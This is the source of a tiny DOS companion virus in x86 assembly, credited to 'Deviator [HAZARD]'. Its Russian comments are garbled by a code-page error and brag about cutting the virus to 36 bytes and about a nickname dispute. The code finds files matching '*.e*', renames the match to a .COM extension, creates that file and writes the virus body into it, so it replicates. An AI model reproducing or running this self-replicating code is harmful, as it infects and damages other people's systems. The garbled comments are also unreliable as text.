   ; Œ®ï ¢¥àá¨ï á ¬®£® ¬ «¥ìª®£® á¯ãâ¨ª  !
   ; * §¬¥à = 36 ¡ ©â... *®ª  ï ®¡®£ « Duk'a/SMF...

   ; *¥ª®â®àë¥ ¨¤¥¨ ¡ë«¨ ¢§ïâë ã Duk'a, ®¤ ª® ¢¨àãá ¬®©.
   ; “ ¬¥ï,¢® ¢à¥¬ï à §à ¡®âª¨ ¡ë«  ¨å æ¥« ï á¥à¨ï (®â 64 ¡ ©â ¤® 36)

   ; P.S ‚¨àãá ¥áâ ¡¨«¥ ¯à¨ ¥ áâ ¤ àâ®¬ á®¤¥à¦ ¨¨ à¥£¨áâà®¢ ¯à¨ § ¯ãáª¥
   ; â.¥. ¤®«¦® ¡ëâì à ¢® Si = 100h,Di=Sp (-2 ¨«¨ 0FFFEh) Ax,Bx,Cx,Dx = 0.

   ; P.S.S Ÿ â®â á ¬ë© Soulburner,ª®â®àë© ®¯ã¡«¨ª®¢ « á¢®© ¢¨àãá ¢ DVL#6.
   ;  *¥è¨« ¯¥à¥¨¬¥®¢ âáï ¢ Deviator - á¬®âàî «®å®¢ áâ®«ìª® à §¢¥«®áì,
   ; ã ª®â®àëå ä â §¨¨ ¤«ï ¯à¨¤ã¬ë¢ ¨ï á¢®¥£® ®à¨£¨ «ì®£® Nick'a á®¢á¥¬ ¥â.
   ;  Ÿ ¡ë« ¯®¤ ¯à®§¢¨é¥¬ SoulBurner á 1996, á¬®âàî ®ª®«® ¤¢ãå ¬¥áïæ¥¢ â®¬ã
   ;  § ¤,¢ UnderNet   ª  «¥ #TeenChat,¯®ï¢¨«áï Soulburner ¨§ Œ « §¨¨ !
   ;  —¥à¥§ ¥ª®â®à®¥ ¢à¥¬ï ã Mr.Quail (my team member) á¬®âàî ¯à®£à ¬¬ªã
   ; á¢ï§ ãî á  ªª®à¤ ¬¨ ¤«ï £¨â àë,   â ¬ Nick - SoulBurner, ¤  ¨ ¯à®£à ¬¬ 
   ; ¤ â¨à®¢   1998 £®¤®¬. *à¨ç¥¬ ¯à®£à ¬¬ª    àãááª®¬ ï§ëª¥... ‚®â ¯ ¤«ë !

   ; “ [Hazard] Team ®âªàë¢ ¥âáï HomePage. Š®£¤  ¡ã¤¥â £®â®¢®,ª¨ã link.

   ; Hi Dukie ! ;)

   ; Œ¥ìè¥ ¥ ¯®«ãç ¥âáï :(

   ; Deviator [HAZARD]

   .model tiny
   .386
   .code
       org 100h
   Mt_38:  db  '*.e*'      ; * è  ¬ áª 

       mov ah,4eh      ; ˆé¥¬ ä ©«
       Call Gotcha
   Gotcha: mov dx,si       ; Dx = 100h
       int 21h         ; Dos

       mov dx,9Eh      ; Dx = 9Eh
       mov ax,5B00h+'.'    ; ˆé¥¬ '.'
   repne   scasb           ; Lets Go
       mov [di],'MOC'      ; Œ¥ï¥¬ à áè¨à¥¨¥   COM

       mov cx,si       ; Cx = 256 (100h)
       int 21h         ; Ah = 5B,á®§¤ âì ä ©« ¥á«¨ ¥ áãé¥áâ¢ã¥â
       xchg ax,bx      ; Handle ¢ Bx
       mov ah,40h      ; *¨è¨¬  á
       ret         ; *  Gotcha
   end Mt_38
